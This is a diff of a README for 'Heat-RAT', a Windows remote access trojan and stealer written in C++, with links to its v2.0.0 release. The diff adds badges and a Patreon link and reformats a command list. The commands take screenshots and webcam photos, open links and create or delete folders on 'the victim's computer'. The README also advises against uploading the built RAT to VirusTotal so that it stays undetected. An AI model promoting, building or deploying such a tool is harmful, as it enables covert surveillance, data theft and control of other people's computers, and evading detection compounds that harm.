@@ -1,12 +1,18 @@
 <a id ="up"></a>
-[![logo](files_for_GitHub/LOGO.png)](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v1.5.0)
-[RAT+STEALER](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v1.5.0)
+[![logo](files_for_GitHub/LOGO.png)](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v2.0.0)
+<img src="https://img.shields.io/badge/C%2B%2B-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white">
+<img src="https://img.shields.io/badge/C-00599C?style=for-the-badge&logo=c&logoColor=white">
+<img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white">
+<img src="https://img.shields.io/badge/tests-98/100-76B900?style=for-the-badge&logo=&logoColor=whit">
+<img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=&logoColor=whit">
+<img src="https://img.shields.io/badge/Heat:::RAT-v2.0.0-blue?style=for-the-badge&logo=&logoColor=whit">
+<img src="https://img.shields.io/badge/platform-windows-989898?style=for-the-badge&logo=&logoColor=whit">
+
+[RAT+STEALER](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v2.0.0)
 ---
 🔭Program for remote control of windows computers via cmd. Written in C++
 
 ⭐Please, star this repo if it was helpful⭐
-
-Huge update soon
 
 ---
 
@@ -24,23 +30,23 @@ __Don't upload builded rat to Virustotal__. The more often you upload it, the mo
  
 ### 📠Functions:
 
-command = "!screenshot"
-using to : do a screenshot and sent to you
+> !screenshot"
+> - do a screenshot and sent to you
 
-command = "!photoWebcam"
-using to : do a photo from the webcam and sent to you
+> "!photoWebcam"
+>- do a photo from the webcam and sent to you
 
-command = "!openLink"
-using to : open the link on the victim's computer
+> "!openLink"
+>- open the link on the victim's computer
 
-command = "!directory"
-using for: get a path to rat virus
+> "!directory"
+>- get a path to rat virus
 
-command = "!directoryContent"
-using for: get all files name placed in the same directory with virus
+> "!directoryContent"
+>- get all files name placed in the same directory with virus
 
-command = "!createFolder"
-using for: create a folder on the victim's computer
+> "!createFolder"
+>- create a folder on the victim's computer
 
 command = "!deleteFolder"
 using for: delete a folder on the victim's computer
@@ -150,6 +156,7 @@ using for: booom
 ### 💰 Donate
 
    <a href="https://www.donationalerts.com/r/nick_vinesmoke"><img src="https://img.shields.io/badge/Donationalerts-F37623?style=for-the-badge&logo=Cash%20App&logoColor=white"></a>
+   <a href="https://patreon.com/NickVinesmoke"><img src="https://img.shields.io/badge/Patreon-F96854?style=for-the-badge&logo=patreon&logoColor=white"></a>
 
 ---
 ### 📲Contacts
